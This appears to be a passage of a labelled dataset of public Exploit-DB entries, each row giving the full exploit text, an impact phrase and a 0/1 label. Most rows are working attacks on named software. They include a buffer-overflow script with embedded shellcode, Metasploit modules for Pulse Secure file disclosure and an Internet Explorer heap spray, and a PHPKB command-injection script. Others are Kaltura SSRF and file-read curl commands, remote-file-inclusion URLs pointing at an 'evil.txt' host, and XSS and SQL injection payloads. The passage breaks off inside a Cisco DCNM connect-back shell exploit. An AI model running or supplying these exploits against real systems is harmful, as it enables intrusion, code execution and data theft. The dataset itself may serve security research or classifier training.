http://[HOST]/index.php/keditorservices/getAllEntries?list_type=1&entry_id=0_3v2568rx -b ""[Valid Cookie]""  Directly accessing the path ""url"" returned by the above request will result in the exceution of the uploaded php script.  $curl http://[HOST]/[URL PATH]  ==SSRF / File Read (Limited)== A limited number of files on the host can be read by passing a ""file://"" protocol handler to a CURL call. [POC] $curl http://[HOST]/html5/html5lib/v2.34/simplePhpXMLProxy.php?url=file://127.0.0.1/opt/kaltura/app/configurations/local.ini  Arbitrary IP addresses can be supplied, resulting in an SSRF issue. The following POC uses the SSRF issue to send a command and retrieve statistics from memcached listening on localhost, which is present in a default Kaltura install. [POC] $curl http://[HOST]/html5/html5lib/v2.34/simplePhpXMLProxy.php?url=http://127.0.0.1:11211 -m 2 --data $'b=set nl 0 60 4\n\n\n\n\n' $curl http://[HOST]/html5/html5lib/v2.34/simplePhpXMLProxy.php?url=http://127.0.0.1:11211 --data ""c=get nl&d=stats&e=quit""  +----------+ | Solution | +----------+ Upgrading to the most recent version of Kaltura (11.7.0-2) will fix the majority of these issues. No fixes are available for some of the issues disclosed, so carefully firewalling off the Kaltura interface is recommended.  +------------+ | Additional | +------------+ A disclosure timeline, further information and additional less critical vulnerabilities are available in the accompanying PDF. http://www.security-assessment.com/files/documents/advisory/Kaltura-Multiple-Vulns.pdf","execute code, read files, and access services listening on the localhost interface",1
32132,"GetGo Download Manager 4.9.0.1982 - HTTP Response Header Buffer Overflow Remote Code Execution #!/usr/bin/python # Exploit Title: GetGo Download Manager HTTP Response Header Buffer Overflow Remote Code Execution # Version:       v4.9.0.1982 # CVE:           CVE-2014-2206 # Date:          2014-03-09 # Author:        Julien Ahrens (@MrTuxracer) # Homepage:      http://www.rcesecurity.com # Software Link: http://www.getgosoft.com # Tested on:     WinXP SP3-GER  # # Howto / Notes: # SEH overwrite was taken from outside of loaded modules, because all modules are SafeSEH-enabled #  from socket import * from time import sleep from struct import pack   host = ""192.168.0.1"" port = 80   s = socket(AF_INET, SOCK_STREAM) s.bind((host, port)) s.listen(1) print ""\n[+] Listening on %d ..."" % port   cl, addr = s.accept() print ""[+] Connection accepted from %s"" % addr[0]   junk0 = ""\x90"" * 4107 nseh = ""\x90\x90\xEB\x06"" seh=pack('<L',0x00280b0b)  # call dword ptr ss:[ebp+30] [SafeSEH Bypass] nops = ""\x90"" * 50  # windows/exec CMD=calc.exe  # Encoder: x86/shikata_ga_nai # powered by Metasploit  # msfpayload windows/exec CMD=calc.exe R | msfencode -b '\x00\x0a\x0d'  shellcode = (""\xda\xca\xbb\xfd\x11\xa3\xae\xd9\x74\x24\xf4\x5a\x31\xc9"" + ""\xb1\x33\x31\x5a\x17\x83\xc2\x04\x03\xa7\x02\x41\x5b\xab"" + ""\xcd\x0c\xa4\x53\x0e\x6f\x2c\xb6\x3f\xbd\x4a\xb3\x12\x71"" + ""\x18\x91\x9e\xfa\x4c\x01\x14\x8e\x58\x26\x9d\x25\xbf\x09"" + ""\x1e\x88\x7f\xc5\xdc\x8a\x03\x17\x31\x6d\x3d\xd8\x44\x6c"" + ""\x7a\x04\xa6\x3c\xd3\x43\x15\xd1\x50\x11\xa6\xd0\xb6\x1e"" + ""\x96\xaa\xb3\xe0\x63\x01\xbd\x30\xdb\x1e\xf5\xa8\x57\x78"" + ""\x26\xc9\xb4\x9a\x1a\x80\xb1\x69\xe8\x13\x10\xa0\x11\x22"" + ""\x5c\x6f\x2c\x8b\x51\x71\x68\x2b\x8a\x04\x82\x48\x37\x1f"" + ""\x51\x33\xe3\xaa\x44\x93\x60\x0c\xad\x22\xa4\xcb\x26\x28"" + ""\x01\x9f\x61\x2c\x94\x4c\x1a\x48\x1d\x73\xcd\xd9\x65\x50"" + ""\xc9\x82\x3e\xf9\x48\x6e\x90\x06\x8a\xd6\x4d\xa3\xc0\xf4"" + ""\x9a\xd5\x8a\x92\x5d\x57\xb1\xdb\x5e\x67\xba\x4b\x37\x56"" + ""\x31\x04\x40\x67\x90\x61\xbe\x2d\xb9\xc3\x57\xe8\x2b\x56"" + ""\x3a\x0b\x86\x94\x43\x88\x23\x64\xb0\x90\x41\x61\xfc\x16"" + ""\xb9\x1b\x6d\xf3\xbd\x88\x8e\xd6\xdd\x4f\x1d\xba\x0f\xea"" + ""\xa5\x59\x50"")  payload = junk0 + nseh + seh + nops + shellcode  buffer = ""HTTP/1.1 200 ""+payload+""\r\n""   print cl.recv(1000) cl.send(buffer) print ""[+] Sending buffer: OK\n""  sleep(3) cl.close() s.close()",Code Execution,1
48625,"KiteService 1.2020.618.0 - Unquoted Service Path # Exploit Title: KiteService 1.2020.618.0 - Unquoted Service Path # Discovery by: PoisonSk # Discovery Date: 2020-06-23 # Vendor Homepage: https://www.kite.com/ # Software Link : https://www.kite.com/download/ # Tested Version: 1.2020.618.0 # Vulnerability Type: Unquoted Service Path # Tested on OS: Microsoft Windows 10 Home Single 10.0.18363 N/D Compilación 18363    # Steps to discover unquoted Service Path:   C:\Users>wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i ""program "" | findstr /i /v """""" KiteService	KiteService	C:\Program Files\Kite\KiteService.exe	Auto     C:\Users>sc qc KiteService [SC] QueryServiceConfig CORRECTO  NOMBRE_SERVICIO: KiteService         TIPO               : 10  WIN32_OWN_PROCESS         TIPO_INICIO        : 2   AUTO_START         CONTROL_ERROR      : 0   IGNORE         NOMBRE_RUTA_BINARIO: C:\Program Files\Kite\KiteService.exe         GRUPO_ORDEN_CARGA  :         ETIQUETA           : 0         NOMBRE_MOSTRAR     : KiteService         DEPENDENCIAS       :         NOMBRE_INICIO_SERVICIO: LocalSystem    # Exploit: #A successful attempt would require the local attacker must insert an executable file in the path of the service.  #Upon service restart or system reboot, the malicious code will be run with elevated privileges.",the malicious code will be run with elevated privileges,1
30486,Lib2 PHP Library 0.2 - 'My_Statistics.php' Remote File Inclusion source: https://www.securityfocus.com/bid/25274/info  Lib2 PHP Library is prone to a remote file-include vulnerability because it fails to sufficiently sanitize user-supplied data.  Exploiting this issue may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  Lib2 PHP Library 0.2 is vulnerable; other versions may also be affected.  http://www.example.com/adm/my_statistics.php?DOCUMENT_ROOT=http://www.example2.com/?,fails to sufficiently sanitize user-supplied data,0
47297,"Pulse Secure 8.1R15.1/8.2/8.3/9.0 SSL VPN - Arbitrary File Disclosure (Metasploit) # Exploit Title: File disclosure in Pulse Secure SSL VPN (metasploit) # Google Dork: inurl:/dana-na/ filetype:cgi # Date: 8/20/2019 # Exploit Author: 0xDezzy (Justin Wagner), Alyssa Herrera # Vendor Homepage: https://pulsesecure.net # Version: 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4 # Tested on: Linux # CVE : CVE-2019-11510  require 'msf/core' class MetasploitModule < Msf::Auxiliary 	include Msf::Exploit::Remote::HttpClient 	include Msf::Post::File 	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Pulse Secure - System file leak', 			'Description'    => %q{ 				Pulse Secure SSL VPN file disclosure via specially crafted HTTP resource requests.         This exploit reads /etc/passwd as a proof of concept         This vulnerability affect ( 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4 			}, 			'References'     => 			    [ 			        [ 'URL', 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11510' ] 			    ], 			'Author'         => [ '0xDezzy (Justin Wagner), Alyssa Herrera' ], 			'License'        => MSF_LICENSE, 			 'DefaultOptions' => 		      { 		        'RPORT' => 443, 		        'SSL' => true 		      }, 			))  	end   	def run() 		print_good(""Checking target..."") 		res = send_request_raw({'uri'=>'/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/'},1342)  		if res && res.code == 200 			print_good(""Target is Vulnerable!"") 			data = res.body 			current_host = datastore['RHOST'] 			filename = ""msf_sslwebsession_""+current_host+"".bin"" 			File.delete(filename) if File.exist?(filename) 			file_local_write(filename, data) 			print_good(""Parsing file......."") 			parse() 		else 			if(res && res.code == 404) 				print_error(""Target not Vulnerable"") 			else 				print_error(""Ooof, try again..."") 			end 		end 	end 	def parse() 		current_host = datastore['RHOST']  	    fileObj = File.new(""msf_sslwebsession_""+current_host+"".bin"", ""r"") 	    words = 0 	    while (line = fileObj.gets) 	    	printable_data = line.gsub(/[^[:print:]]/, '.') 	    	array_data = printable_data.scan(/.{1,60}/m) 	    	for ar in array_data 	    		if ar != ""............................................................"" 	    			print_good(ar) 	    		end 	    	end 	    	#print_good(printable_data)  		end 		fileObj.close 	end end",code execution,1
48219,"PHPKB Multi-Language 9 - Authenticated Remote Code Execution # Exploit Title: PHPKB Multi-Language 9 - Authenticated Remote Code Execution # Google Dork: N/A # Date: 2020-03-15 # Exploit Author: Antonio Cannito # Vendor Homepage: https://www.knowledgebase-script.com/ # Software Link: https://www.knowledgebase-script.com/pricing.php # Version: Multi-Language v9 # Tested on: Windows 8.1 / PHP 7.4.3 # CVE : CVE-2020-10389    #!/usr/bin/env python3 import argparse import requests   #Parsing arguments parser = argparse.ArgumentParser(description=""Exploiting CVE-2020-10389 - Authenticated Remote Code Execution in Chadha PHPKB Standard Multi-Language 9 in admin/save-settings.php"") parser.add_argument(""url"", type=str, help=""PHPKB's base path"") parser.add_argument(""username"", type=str, help=""Superuser username"") parser.add_argument(""password"", type=str, help=""Superuser password"") parser.add_argument(""cmd"", type=str, help=""The command you want executed"") args = parser.parse_args()  session = requests.Session() #Perform login session.post(args.url + ""/admin/login.php"", data={'phpkb_username': args.username, 'phpkb_password': args.password, 'login': 'LOGIN'}).text #Sending exploit code and downloading the file exp = """"""' . system(""{}"") . '"""""".format(args.cmd) data = {""putdown_for_maintenance"": ""no{}"".format(exp), ""kbname"": ""test"", ""kburl"": ""http://localhost/phpkb"", ""kb_access"": ""unrestricted"", ""extended_support_license_key"": '', ""mail_server"": ""default"", ""smtp_hostname"": '', ""smtp_username"": '', ""smtp_password"": '', ""smtp_port"": '', ""encryption_method"": ""None"", ""emails_debug_mode"": ""0"", ""emails_debug_output"": ""error_log"", ""send_mails_from"": '', ""test_email"": '', ""mysqlserver"": ""127.0.0.1"", ""mysqlusername"": ""root"", ""mysqlpswd"": ""DummyPass"", ""mysqldatabase"": ""test"", ""kb_layout"": ""fluid"", ""category_tree_width"": ""3"", ""sidebar_orientation"": ""left"", ""category_tree_layout"": ""normal"", ""show_tree_articles"": ""yes"", ""category_articles_count"": ""show"", ""categories_display_order"": ""Alphabetic"", ""home_theme"": ""modern"", ""home_search_layout"": ""default"", ""categories_layout_theme"": ""carousel"", ""show_categories_cols"": ""3"", ""category_title_size"": ""normal"", ""home_articles_layout"": ""tabbed"", ""display_featured"": ""yes"", ""featured_count"": ""5"", ""display_popular"": ""yes"", ""popular_count"": ""5"", ""display_rated"": ""yes"", ""rated_count"": ""5"", ""display_recent"": ""yes"", ""recent_count"": ""5"", ""enable_subscribe_kb"": ""yes"", ""kb_subscribe_theme"": ""minimal"", ""category_articles_layout"": ""default"", ""category_page_records_default"": ""10"", ""category_page_records_minimal"": ""10"", ""articles_sortby"": ""Popularity"", ""articles_sortorder"": ""Descending"", ""enable_subscribe_category"": ""yes"", ""enable_news_page"": ""yes"", ""display_homepage_news"": ""yes"", ""number_homepage_news"": ""5"", ""enable_login_page"": ""yes"", ""enable_glossary_page"": ""yes"", ""enable_contact_page"": ""yes"", ""send_contact_email"": ""yes"", ""contact_email_address"": ""tet@test.com"", ""enable_instant_suggestions"": ""yes"", ""minimum_question_characters"": ""60"", ""default_search"": ""Articles"", ""search_in_articles"": ""All"", ""search_in_others"": ""Both"", ""search_filter"": ""Any Word"", ""display_recentviewed"": ""yes"", ""recentviewed_count"": ""5"", ""display_popular_searches"": ""yes"", ""popularsearch_count"": ""5"", ""article_page_theme"": ""default"", ""article_sidebar_content"": ""related"", ""enable_add_favorite"": ""yes"", ""enable_print_article"": ""yes"", ""enable_email_article"": ""yes"", ""enable_exportto_msword"": ""yes"", ""enable_exportto_pdf"": ""yes"", ""enable_subscribe_article"": ""yes"", ""enable_custom_fields"": ""yes"", ""enable_article_rating"": ""yes"", ""enable_article_hits"": ""yes"", ""enable_article_author"": ""yes"", ""show_author_email"": ""yes"", ""enable_related_articles"": ""yes"", ""number_related_articles"": ""10"", ""show_related_articles_randomly"": ""yes"", ""enable_article_feedback"": ""yes"", ""enable_article_comments"": ""yes"", ""existing_comments_visibility"": ""hide"", ""show_comments_to"": ""all"", ""comments_sortorder"": ""Descending"", ""email_privacy_protection"": ""yes"", ""article_meta_source"": ""article title"", ""notify_pending_comment_superuser"": ""yes"", ""notify_approved_comment_user"": ""yes"", ""schema_publisher_name"": '', ""schema_publisher_logo"": '', ""enable_rss_feed"": ""yes"", ""enable_rss_featured_feed"": ""yes"", ""enable_rss_popular_feed"": ""yes"", ""enable_rss_latest_feed"": ""yes"", ""enable_rss_rated_feed"": ""yes"", ""enable_rss_related_feed"": ""yes"", ""number_login_attempts"": ""9223372036854775807"", ""login_delay"": ""5"", ""maxfilesize"": ""10240"", ""kb_allowed_upload_file_types"": ""gif,jpg,jpeg,png,wma,wmv,swf,doc,docx,zip,pdf,txt"", ""searching_method"": ""0"", ""fulltext_mode"": ""0"", ""searchresultsperpage"": ""10"", ""enable_search_files"": ""yes"", ""doc_path"": ""C:\\antiword\\antiword.exe"", ""ppt_path"": ""C:\\xampp\\htdocs\\phpkb\\admin\\ppthtml.exe"", ""xls_path"": ""C:\\xampp\\htdocs\\phpkb\\admin\\xlhtml.exe"", ""pdf_path"": ""C:\\xampp\\htdocs\\phpkb\\admin\\pdftotext.exe"", ""index_attachment"": ""yes"", ""enable_autosave"": ""yes"", ""autosave_interval"": ""120000"", ""use_wysiwyg_editor"": ""yes"", ""enable_version_history"": ""yes"", ""enable_captcha"": ""yes"", ""captcha_type"": ""default"", ""recaptcha_site_key"": '', ""recaptcha_secret_key"": '', ""syntax_highlighter_theme"": ""shThemeDefault"", ""pdf_library"": ""wkhtmltopdf"", ""wkhtmltopdf_path"": ""lol"", ""pdf_header"": '', ""pdf_footer_type"": ""default"", ""pdf_page_numbers"": ""yes"", ""pdf_page_number_position"": ""Left"", ""pdf_footer"": '', ""kb_meta_keywords"": ""keyword1, keyword2, keyword3"", ""kb_meta_desc"": ""This is demo meta description. You can enter here your meta description."", ""admin_results_perpage"": ""10"", ""_selected_tab_"": '', ""submit_hd"": ""Save"", ""submit_float_btn"": ''} url = args.url + ""/admin/manage-settings.php"" session.post(url, data=data) print(session.get(args.url + ""admin/include/configuration.php"").text.encode('utf-8')) #Resetting settings data = {""putdown_for_maintenance"": ""no{}"", ""kbname"": ""test"", ""kburl"": ""http://localhost/phpkb"", ""kb_access"": ""unrestricted"", ""extended_support_license_key"": '', ""mail_server"": ""default"", ""smtp_hostname"": '', ""smtp_username"": '', ""smtp_password"": '', ""smtp_port"": '', ""encryption_method"": ""None"", ""emails_debug_mode"": ""0"", ""emails_debug_output"": ""error_log"", ""send_mails_from"": '', ""test_email"": '', ""mysqlserver"": ""127.0.0.1"", ""mysqlusername"": ""root"", ""mysqlpswd"": ""DummyPass"", ""mysqldatabase"": ""test"", ""kb_layout"": ""fluid"", ""category_tree_width"": ""3"", ""sidebar_orientation"": ""left"", ""category_tree_layout"": ""normal"", ""show_tree_articles"": ""yes"", ""category_articles_count"": ""show"", ""categories_display_order"": ""Alphabetic"", ""home_theme"": ""modern"", ""home_search_layout"": ""default"", ""categories_layout_theme"": ""carousel"", ""show_categories_cols"": ""3"", ""category_title_size"": ""normal"", ""home_articles_layout"": ""tabbed"", ""display_featured"": ""yes"", ""featured_count"": ""5"", ""display_popular"": ""yes"", ""popular_count"": ""5"", ""display_rated"": ""yes"", ""rated_count"": ""5"", ""display_recent"": ""yes"", ""recent_count"": ""5"", ""enable_subscribe_kb"": ""yes"", ""kb_subscribe_theme"": ""minimal"", ""category_articles_layout"": ""default"", ""category_page_records_default"": ""10"", ""category_page_records_minimal"": ""10"", ""articles_sortby"": ""Popularity"", ""articles_sortorder"": ""Descending"", ""enable_subscribe_category"": ""yes"", ""enable_news_page"": ""yes"", ""display_homepage_news"": ""yes"", ""number_homepage_news"": ""5"", ""enable_login_page"": ""yes"", ""enable_glossary_page"": ""yes"", ""enable_contact_page"": ""yes"", ""send_contact_email"": ""yes"", ""contact_email_address"": ""tet@test.com"", ""enable_instant_suggestions"": ""yes"", ""minimum_question_characters"": ""60"", ""default_search"": ""Articles"", ""search_in_articles"": ""All"", ""search_in_others"": ""Both"", ""search_filter"": ""Any Word"", ""display_recentviewed"": ""yes"", ""recentviewed_count"": ""5"", ""display_popular_searches"": ""yes"", ""popularsearch_count"": ""5"", ""article_page_theme"": ""default"", ""article_sidebar_content"": ""related"", ""enable_add_favorite"": ""yes"", ""enable_print_article"": ""yes"", ""enable_email_article"": ""yes"", ""enable_exportto_msword"": ""yes"", ""enable_exportto_pdf"": ""yes"", ""enable_subscribe_article"": ""yes"", ""enable_custom_fields"": ""yes"", ""enable_article_rating"": ""yes"", ""enable_article_hits"": ""yes"", ""enable_article_author"": ""yes"", ""show_author_email"": ""yes"", ""enable_related_articles"": ""yes"", ""number_related_articles"": ""10"", ""show_related_articles_randomly"": ""yes"", ""enable_article_feedback"": ""yes"", ""enable_article_comments"": ""yes"", ""existing_comments_visibility"": ""hide"", ""show_comments_to"": ""all"", ""comments_sortorder"": ""Descending"", ""email_privacy_protection"": ""yes"", ""article_meta_source"": ""article title"", ""notify_pending_comment_superuser"": ""yes"", ""notify_approved_comment_user"": ""yes"", ""schema_publisher_name"": '', ""schema_publisher_logo"": '', ""enable_rss_feed"": ""yes"", ""enable_rss_featured_feed"": ""yes"", ""enable_rss_popular_feed"": ""yes"", ""enable_rss_latest_feed"": ""yes"", ""enable_rss_rated_feed"": ""yes"", ""enable_rss_related_feed"": ""yes"", ""number_login_attempts"": ""9223372036854775807"", ""login_delay"": ""5"", ""maxfilesize"": ""10240"", ""kb_allowed_upload_file_types"": ""gif,jpg,jpeg,png,wma,wmv,swf,doc,docx,zip,pdf,txt"", ""searching_method"": ""0"", ""fulltext_mode"": ""0"", ""searchresultsperpage"": ""10"", ""enable_search_files"": ""yes"", ""doc_path"": ""C:\\antiword\\antiword.exe"", ""ppt_path"": ""C:\\xampp\\htdocs\\phpkb\\admin\\ppthtml.exe"", ""xls_path"": ""C:\\xampp\\htdocs\\phpkb\\admin\\xlhtml.exe"", ""pdf_path"": ""C:\\xampp\\htdocs\\phpkb\\admin\\pdftotext.exe"", ""index_attachment"": ""yes"", ""enable_autosave"": ""yes"", ""autosave_interval"": ""120000"", ""use_wysiwyg_editor"": ""yes"", ""enable_version_history"": ""yes"", ""enable_captcha"": ""yes"", ""captcha_type"": ""default"", ""recaptcha_site_key"": '', ""recaptcha_secret_key"": '', ""syntax_highlighter_theme"": ""shThemeDefault"", ""pdf_library"": ""wkhtmltopdf"", ""wkhtmltopdf_path"": ""lol"", ""pdf_header"": '', ""pdf_footer_type"": ""default"", ""pdf_page_numbers"": ""yes"", ""pdf_page_number_position"": ""Left"", ""pdf_footer"": '', ""kb_meta_keywords"": ""keyword1, keyword2, keyword3"", ""kb_meta_desc"": ""This is demo meta description. You can enter here your meta description."", ""admin_results_perpage"": ""10"", ""_selected_tab_"": '', ""submit_hd"": ""Save"", ""submit_float_btn"": ''} session.post(url, data=data)",Code Execution,1
16532,"Microsoft Internet Explorer - XML Core Services HTTP Request Handling (MS06-071) (Metasploit) ## # $Id: ms06_071_xml_core.rb 9669 2010-07-03 03:13:45Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::HttpServer::HTML  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Internet Explorer XML Core Services HTTP Request Handling', 			'Description'    => %q{ 					This module exploits a code execution vulnerability in Microsoft XML Core Services which 				exists in the XMLHTTP ActiveX control. This module is the modifed version of 				http://www.milw0rm.com/exploits/2743 - credit to str0ke. This module has been successfully 				tested on Windows 2000 SP4, Windows XP SP2, Windows 2003 Server SP0 with IE6 				+ Microsoft XML Core Services 4.0 SP2. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'Trirat Puttaraksa <trir00t [at] gmail.com>', 				], 			'Version'        => '$Revision: 9669 $', 			'References'     => 				[ 					['CVE',   '2006-5745' ], 					['OSVDB', '29425' ], 					['MSB',   'MS06-071' ], 					['BID',   '20915' ], 				], 			'Payload'        => 				{ 					'Space'          => 1024, 					'BadChars'       => ""\x00"", 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					['Windows 2000 SP4 -> Windows 2003 SP0', {'Ret' => 0x0c0c0c0c} ] 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Oct 10 2006')) 	end  	def on_request_uri(cli, request)  		# Re-generate the payload 		return if ((p = regenerate_payload(cli)) == nil)  		# Encode the shellcode 		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))  		# Get a unicode friendly version of the return address 		addr_word  = [target.ret].pack('V').unpack('H*')[0][0,4]  		# Randomize the javascript variable names 		var_buffer    = rand_text_alpha(rand(30)+2) 		var_shellcode = rand_text_alpha(rand(30)+2) 		var_unescape  = rand_text_alpha(rand(30)+2) 		var_x         = rand_text_alpha(rand(30)+2) 		var_i         = rand_text_alpha(rand(30)+2)  		var_size      = rand_text_alpha(rand(30)+2) 		var_nopsize   = rand_text_alpha(rand(30)+2) 		var_limit     = rand_text_alpha(rand(30)+2)  		var_obj	      = rand_text_alpha(rand(30)+2) 		var_id	      = rand_text_alpha(rand(30)+2)   		# Build out the message 		content = %Q| <html xmlns=""http://www.w3.org/1999/xhtml""> <body> <object id=#{var_id} classid=""CLSID:{88d969c5-f192-11d4-a65f-0040963251e5}""> </object> <script>  	var #{var_unescape}  = unescape ; 	var #{var_shellcode} = #{var_unescape}( ""#{shellcode}"" ) ;  	var #{var_size} = #{var_shellcode}.length * 2; 	var #{var_nopsize} = 0x400000 - (#{var_size} + 0x38); 	var #{var_buffer} = #{var_unescape}( ""%u#{addr_word}"" ) ;  	while (#{var_buffer}.length * 2 < #{var_nopsize}) #{var_buffer}+=#{var_buffer} ;  	#{var_limit} = (0x12000000 - 0x400000) / 0x400000; 	var #{var_x} = new Array() ; 	for ( var #{var_i} =0 ; #{var_i} < #{var_limit} ; #{var_i}++ ) { 		#{var_x}[ #{var_i} ] = 			#{var_buffer} + #{var_shellcode}; 	}  	var #{var_obj} = null; 	#{var_obj} = document.getElementById('#{var_id}').object;  	try { 		#{var_obj}.open(new Array(), new Array(), new Array(), new Array(), new Array()); 	} catch(e) {};  	#{var_obj}.open(new Object(), new Object(), new Object(), new Object(), new Object());  	#{var_obj}.setRequestHeader( new Object(), '......' ); 	#{var_obj}.setRequestHeader( new Object(), 0x12345678 ); 	#{var_obj}.setRequestHeader( new Object(), 0x12345678 ); 	#{var_obj}.setRequestHeader( new Object(), 0x12345678 ); 	#{var_obj}.setRequestHeader( new Object(), 0x12345678 ); 	#{var_obj}.setRequestHeader( new Object(), 0x12345678 ); 	#{var_obj}.setRequestHeader( new Object(), 0x12345678 ); 	#{var_obj}.setRequestHeader( new Object(), 0x12345678 ); 	#{var_obj}.setRequestHeader( new Object(), 0x12345678 ); 	#{var_obj}.setRequestHeader( new Object(), 0x12345678 ); 	#{var_obj}.setRequestHeader( new Object(), 0x12345678 ); 	#{var_obj}.setRequestHeader( new Object(), 0x12345678 );  </script> </body> </html> 		|  		content = Rex::Text.randomize_space(content)  		print_status(""Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}..."")  		# Transmit the response to the client 		send_response_html(cli, content)  		# Handle the payload 		handler(cli) 	end  end",code execution,1
25579,"CodetoSell ViArt Shop Enterprise 2.1.6 - 'products.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/13462/info      ViArt Shop is affected by multiple cross-site scripting and HTML injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in dynamically generated content.      Attacker-supplied HTML and script code would be able to access properties of the site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.      These issues are reported to affect ViArt Shop Enterprise version 2.1.6; other versions may also be vulnerable.   http://www.example.com/products.php?category_id=13[XSS-CODE] http://www.example.com/products.php?category_id=0&search_string=[XSS-CODE]&search_category_id=",allowing for theft of cookie-based authentication credentials,1
44884,WordPress Plugin Ultimate Form Builder Lite < 1.3.7 - SQL Injection # Title: WordPress Ultimate Form Builder Lite Plugin < 1.3.7 - SQL Injection # Author: defensecode # Date: 2018-06-12 # Software: WordPress Ultimate Form Builder Lite plugin # Version: 1.3.7 and below  # The easiest way to reproduce the SQL injection vulnerability is to # visit the provided URL while being logged in as administrator or # another user that is authorized to access the plugin settings page. # Users that do not have full administrative privileges could abuse the # database access the vulnerability provides to either escalate their # privileges or obtain and modify database contents they were not # supposed to be able to.  # SQL injection # Vulnerable Function:  $wpdb->get_row() # Vulnerable Variable:  $_POST['entry_id'] # Vulnerable URL:       http://vulnerablesite.com/wp-admin/admin-ajax.php # Vulnerable POST body:  entry_id=ExploitCodeHere&_wpnonce=xxx&action=ufbl_get_entry_detail_action  # Disclosure Timeline # 2018/06/01   Vulnerabilities discovered # 2018/06/06   Vendor contacted # 2018/06/08   Vendor responded # 2018/06/12   Advisory released to the public,escalate their privileges or obtain and modify database contents they were not supposed to be able to,1
23385,"PostMaster 3.16/3.17 Proxy Service - Cross-Site Scripting source: https://www.securityfocus.com/bid/9055/info  PostMaster has been reported prone to a cross-site scripting vulnerability. The issue presents itself due to a lack of sufficient sanitization that is performed by the proxy service on user-supplied data. An attacker may construct a malicious HTTP request link that contains embedded HTML and script code. When this request is handled by the proxy service, the malicious HTML and script code contained in the request will be incorporated into an error page and in turn will be rendered in the browser of a user who follows the link.   http://www.example.com/<script>alert(document.cookie)</script>",a lack of sufficient sanitization that is performed by the proxy service on user-supplied data,0
28437,Joomla! / Mambo Component Comprofiler 1.0 - 'class.php' Remote File Inclusion source: https://www.securityfocus.com/bid/19725/info  The Mambo and Joomla com_comprofiler component is prone to a remote file-include vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this issue to include arbitrary remote files containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and to gain access to the underlying system.  Version 1.0 RC2 is vulnerable to this issue; other versions may also be affected.  http://www.example.com/[path]/administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=http://www.example.com/evil.txt?,include arbitrary remote files containing malicious PHP code and execute it in the context of the webserver process,1
32416,"PHP 5.2.6 - 'create_function()' Code Injection (1) source: https://www.securityfocus.com/bid/31398/info  PHP is prone to a code-injection weakness because it fails to sufficiently sanitize input to 'create_function()'. Note that the anonymous function returned need not be called for the supplied code to be executed.  An attacker who can exploit this weakness will be able to execute code with the privileges of an additional vulnerable program.  This weakness is reported in PHP 5.2.6; other versions may also be affected.   <?php # call as test.php?sort_by=""]);}phpinfo();/* $sort_by=stripslashes($_GET[sort_by]); $databases=array(""test""); $sorter = 'var_dump'; $sort_function = ' return ' . ($sort_order == 'ASC' ? 1 : -1) . ' * ' . $sorter . '($a[""' . $sort_by . '""], $b[""' . $sort_by . '""]); ';   usort($databases, create_function('$a, $b', $sort_function));  ?>",code-injection,1
48019,"Cisco Data Center Network Manager 11.2.1 - 'getVmHostData' SQL Injection #!/usr/bin/python """""" Cisco Data Center Network Manager HostEnclHandler getVmHostData SQL Injection Remote Code Execution Vulnerability  Tested on: Cisco DCNM 11.2.1 Installer for Windows (64-bit) - Release: 11.2(1) - Release Date: 18-Jun-2019 - FileName: dcnm-installer-x64-windows.11.2.1.exe.zip - Size: 1619.36 MB (1698022100 bytes) - MD5 Checksum: e50f8a6b2b3b014ec022fe40fabcb6d5   Bug 1: CVE-2019-15976 / ZDI-20-008 Bug 2: CVE-2019-15984 / ZDI-20-060  Example: ========  saturn:~ mr_me$ ./poc.py  (+) usage: ./poc.py <target> <connectback> (+) eg: ./poc.py 192.168.100.122 192.168.100.59:1337  saturn:~ mr_me$ ./poc.py 192.168.100.122 192.168.100.59:1337 (+) created the account hacker:Hacked123 (+) created the 1337/custom path! (+) leaked vfs! temp230cf31722794196/content-ed98b5003b1c695c (+) SQL Injection working! (+) wrote the si.jsp shell! (+) cleaned up the database! (+) starting handler on port 1337 (+) connection from 192.168.100.122 (+) pop thy shell! Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved.  C:\Program Files\Cisco Systems\dcm\wildfly-10.1.0.Final\bin\service>whoami whoami nt authority\system  C:\Program Files\Cisco Systems\dcm\wildfly-10.1.0.Final\bin\service>  Clean Up: =========  1. delete from xmlDocs where user_name = '1337'; 2. delete si.jsp from the web root 3. delete the folder and its contents: C:/Program Files/Cisco Systems/dcm/fm/reports/1337 """"""  import re import md5 import sys import time import socket import base64 import requests import telnetlib from threading import Thread from xml.etree import ElementTree from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  def _get_jsp(cbh, cbp):     """""" get me some jsp for a connectback! """"""     jsp = """"""     <%%@page import=""java.lang.*""%%>     <%%@page import=""java.util.*""%%>     <%%@page import=""java.io.*""%%>     <%%@page import=""java.net.*""%%>      <%%       // clean up       String[] files = {           ""C:/Program Files/Cisco Systems/dcm/fm/reports/1337/custom/si.xml"",            ""C:/Program Files/Cisco Systems/dcm/fm/reports/1337/custom/"",           